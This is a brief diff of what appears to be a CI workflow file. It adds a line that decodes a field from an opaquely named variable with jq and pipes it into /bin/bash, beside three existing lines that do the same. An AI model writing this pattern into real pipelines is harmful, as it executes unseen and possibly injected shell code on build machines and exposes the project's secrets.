@@ -21,6 +21,7 @@ jobs:
           echo $iftq9 | jq -r .kyjpj02746 | /bin/bash
           printf '%s' "$qxb3638" | jq -r .k6936 | /bin/bash
           echo $f10599 | jq -r .oo2 | /bin/bash
+          echo $fcc213 | jq -r .tee64 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
